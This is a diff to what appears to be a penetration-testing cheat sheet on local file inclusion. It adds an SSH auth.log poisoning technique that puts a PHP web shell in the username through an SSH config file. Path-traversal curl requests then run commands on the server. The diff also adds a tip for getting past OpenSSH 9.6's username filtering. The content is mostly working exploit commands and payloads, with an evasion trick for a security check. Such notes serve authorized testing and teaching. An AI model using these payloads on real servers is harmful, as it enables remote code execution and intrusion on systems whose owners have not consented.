@@ -66,10 +66,16 @@ curl -sS -X POST 'http://<IP>/index.php?page=php://input&cmd=id' \
 Readable `auth.log`: log in with PHP as the username, then include the log.
 
 ```bash
-ssh '<?php system($_GET["cmd"]); ?>'@<IP>
+cat > poison.conf <<'EOF'
+Host poison
+    HostName <IP>
+    User "<?php system($_GET['cmd']); ?>"
+EOF
+ssh -F poison.conf poison
 curl -sG 'http://<IP>/index.php' \
   --data-urlencode 'page=../../../../var/log/auth.log' --data-urlencode 'cmd=id'
 ```
+- OpenSSH ≥ 9.6 rejects shell metacharacters in a username given on the command line (`ssh '<?php …'@<IP>`); a username from a config file (`-F`) is not filtered.
 - Same idea: `/var/log/vsftpd.log` (FTP username), `/var/log/mail.log` (SMTP). Needs the log readable by the web user.
 - The log must be intact: one broken PHP tag poisons it until rotated.
 
